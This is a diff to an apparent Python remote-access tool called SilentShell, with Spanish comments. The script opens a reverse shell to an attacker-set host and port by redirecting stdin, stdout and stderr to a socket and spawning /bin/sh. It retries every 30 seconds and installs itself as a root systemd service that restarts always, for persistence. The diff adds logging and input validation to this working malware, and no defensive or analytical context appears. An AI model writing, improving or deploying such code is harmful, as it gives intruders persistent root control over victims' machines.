@@ -2,6 +2,10 @@ import os
 import socket
 import time
 import subprocess
+import logging
+
+# Configuración de logging
+logging.basicConfig(filename='/var/log/silentshell.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 RHOST = "YOUR_IP"
 RPORT = PORT
@@ -26,26 +30,37 @@ def limpiar_terminal():
     os.system('clear' if os.name != 'nt' else 'cls')
     print(ASCII_ART)
 
+def validar_parametros():
+    """Valida los parámetros RHOST y RPORT."""
+    if not isinstance(RHOST, str) or not RHOST:
+        raise ValueError("RHOST debe ser una cadena no vacía")
+    if not isinstance(RPORT, int) or RPORT <= 0 or RPORT > 65535:
+        raise ValueError("RPORT debe ser un entero entre 1 y 65535")
+
 def ejecutar_revshell():
+    validar_parametros()
     try:
         s = socket.socket()
         s.connect((RHOST, RPORT))
-        os.dup2(s.fileno(), 0)  
-        os.dup2(s.fileno(), 1)  
-        os.dup2(s.fileno(), 2) 
-        subprocess.call(["/bin/sh"])  
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh"])
+        logging.info("Conexión establecida con éxito")
     except Exception as e:
         print_red(f"Error en la conexión: {e}")
+        logging.error(f"Error en la conexión: {e}")
     finally:
         s.close()
 
 def configurar_inicio():
-    service_content = """[Unit]
+    script_path = os.path.realpath(__file__)
+    service_content = f"""[Unit]
 Description=Revershell Script
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 /root/.SilentShell.py
+ExecStart=/usr/bin/python3 {script_path}
 Restart=always
 User=root
 
@@ -63,15 +78,17 @@ WantedBy=multi-user.target
         subprocess.run(["sudo", "systemctl", "start", "revshell.service"])
         
         print_red("El script ha sido configurado para ejecutarse al inicio de Linux.")
+        logging.info("Servicio configurado para ejecutarse al inicio")
     except Exception as e:
         print_red(f"No se pudo configurar el inicio en Linux: {e}")
+        logging.error(f"No se pudo configurar el inicio en Linux: {e}")
 
 def main():
     while True:
         ejecutar_revshell()
-        time.sleep(30)  
+        time.sleep(30)
 
 if __name__ == "__main__":
     limpiar_terminal()
-    configurar_inicio()  
+    configurar_inicio()
     main()
